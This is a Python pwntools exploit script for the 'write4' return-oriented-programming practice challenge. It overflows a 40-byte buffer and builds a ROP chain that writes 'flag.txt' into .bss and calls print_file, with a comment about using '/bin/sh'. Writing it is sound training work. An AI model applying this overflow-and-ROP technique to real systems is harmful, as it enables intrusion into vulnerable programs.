#!/usr/bin/env python3
import os
from pwn import *
from pwn_ext import *

exe = ELF("./write4_patched")

context.binary = exe
# GDB Compatability stuff
if "alacritty" in os.environ["TERM"]:
    context.terminal = ["alacritty", "-e"]
elif "tmux" in os.environ["TERM"]:
    context.terminal = ["tmux", "splitw", "-h"]
elif os.environ["GNOME_TERMINAL_SCREEN"]:
    context.terminal = ["gnome-terminal", "--"]

# Who needs more than one process?
if args.REMOTE:
    #p = remote("addr", 1337)
    p = nc_remote("") # just put entire nc command or host:port here
elif args.CLEAN:
    p = process([exe.path])
else:
    gdbscript = '''
    b* 0x400510
    b* 0x400610
    c
    '''
    p = gdb.debug([exe.path], gdbscript=gdbscript)

### PUT ACTUAL PWN STUFF BELOW THIS LINE ###

def main():
    # good luck pwning :)
    bss = p64(0x601048)
    # Remember to null terminate
    shString = b"flag.txt"
    offset = b"A"*40

    ret = p64(0x00000000004004e6)
    mov_qword_r14_r15 = p64(0x0000000000400628)
    # pop r14, pop r15 ret. Works perfectly with the mov qword gadget above. r14 should have the address and r15 "bin/sh\x00" or flag.txt
    pop_r14_r15 = p64(0x0000000000400690)
    # Load string into the register in order to call print_file
    pop_rdi = p64(0x0000000000400693)
    print_file = p64(0x0000000000400510)

    # Chain: 
    # Overwrite ret, pop values into r14 and r15, write to .bss
    # then call print_file() with bin/sh location as the argument.
    p.recvuntil(b">")

    # Stack alingment to get rid of file not found! We get a SIGSEGV before the file read.
    p.sendline(offset + ret + pop_r14_r15 + bss + shString + mov_qword_r14_r15 + pop_rdi + bss + print_file) 

    p.interactive()

if __name__ == "__main__":
    main()
